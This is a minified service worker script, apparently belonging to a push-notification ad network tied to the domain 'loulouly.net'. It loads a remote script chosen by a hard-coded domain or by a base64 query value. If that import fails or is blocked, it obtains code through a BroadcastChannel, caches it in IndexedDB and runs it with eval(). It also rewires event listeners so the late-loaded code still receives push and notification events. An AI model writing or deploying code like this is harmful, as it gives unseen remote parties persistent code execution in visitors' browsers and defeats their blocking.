!(function (t) {
  const r = {}
  function o(e) {
    if (r[e]) return r[e].exports
    const n = (r[e] = {})
    return (
      (r[e].i = e),
      (r[e].l = !1),
      (r[e].exports = {}),
      t[e].call(n.exports, n, n.exports, o),
      (n.l = !0),
      n.exports
    )
  }
  ;(o.m = t),
    (o.c = r),
    (o.d = function (e, n, t) {
      o.o(e, n) ||
        Object.defineProperty(e, n, {
          configurable: !1,
          enumerable: !0,
          get: t,
        })
    }),
    (o.n = function (e) {
      const n =
        e && e.__esModule
          ? function () {
              return e.default
            }
          : function () {
              return e
            }
      return o.d(n, 'a', n), n
    }),
    (o.o = function (e, n) {
      return Object.prototype.hasOwnProperty.call(e, n)
    }),
    (o.p = ''),
    o((o.s = 0))
})([
  function (o, p) {
    ;(self.options = {}),
      (self.options.zoneId = 3969862),
      (self.options.domain = 'loulouly.net'),
      (self.options.resubscribeOnInstall = !0),
      (self.lary = '')
    const q = ['https://', '/pfe/current/service-worker.min.js?r=sw&v=2'].join(
      self.options.domain
    )
    const r = 'ukhfoxzdogq'
    const s = 'request'
    const t = 'response'
    const u = 1e4
    const v = 864e5
    const w = 'swadb'
    const x = [
      'install',
      'activate',
      'push',
      'notificationclick',
      'notificationclose',
      'pushsubscriptionchange',
    ]
    let y
    function z() {
      return new Promise(function (o, e) {
        const a = {}
        const i = new BroadcastChannel(r)
        const c = setTimeout(e, u)
        ;(a.type = s),
          (a.channel = r),
          (a.request_id = Math.random().toString(36).slice(2)),
          (a.url = y),
          i.addEventListener('message', function (e) {
            const n = e && e.data && e.data.type
            return (e && e.data && e.data.request_id) === a.request_id &&
              n === t
              ? (i.close(), clearTimeout(c), o(e.data.data))
              : null
          }),
          i.postMessage(a)
      })
    }
    function I() {
      return z().then(function (e) {
        return e && e.response ? e.response : e
      })
    }
    function K(r) {
      return new Promise(function (e, n) {
        const t = indexedDB.open(r, 1)
        t.addEventListener('upgradeneeded', function () {
          t.result.createObjectStore('workers', { keyPath: 'zoneid' })
        }),
          t.addEventListener('success', function () {
            e(t.result)
          }),
          t.addEventListener('error', n)
      })
    }
    const P = K(w)
    function Q(n, t) {
      return P.then(function (e) {
        e.transaction(['workers'], 'readwrite')
          .objectStore('workers')
          .put({ zoneid: n, code: t, updated: new Date().getTime() })
      })
    }
    function W(o) {
      return P.then(function (r) {
        return new Promise(function (e, n) {
          const t = r
            .transaction(['workers'], 'readonly')
            .objectStore('workers')
            .get(o)
          t.addEventListener('error', n),
            t.addEventListener('success', function () {
              e(t.result)
            })
        })
      })
    }
    function a4() {
      return W(self.options.zoneId).then(function (e) {
        let n
        const t = new Date().getTime() - v
        return (
          (!e || e.updated < t) &&
            (n = I().then(function (e) {
              return Q(self.options.zoneId, e).then(function () {
                return e
              })
            })),
          e ? e.code : n
        )
      })
    }
    try {
      if (((y = atob(location.search.slice(1))), !y)) throw null
    } catch (e) {
      y = q
    }
    try {
      importScripts(y)
    } catch (aa) {
      const ab = {}
      const ac = {}
      const ad = self.addEventListener.bind(self)
      x.forEach(function (e) {
        self.addEventListener(e, function (n) {
          ab[e] || (ab[e] = []),
            ab[e].push(n),
            ac[e] &&
              ac[e].forEach(function (e) {
                try {
                  e(n)
                } catch (e) {}
              })
        })
      }),
        (self.addEventListener = function (e, n) {
          if (!x.includes(e)) return ad(e, n)
          ac[e] || (ac[e] = []),
            ac[e].push(n),
            ab[e] &&
              ab[e].forEach(function (e) {
                try {
                  n(e)
                } catch (e) {}
              })
        }),
        a4().then(function (am) {
          eval(am)
        })
    }
  },
]) /* importScripts(...r=sw) */
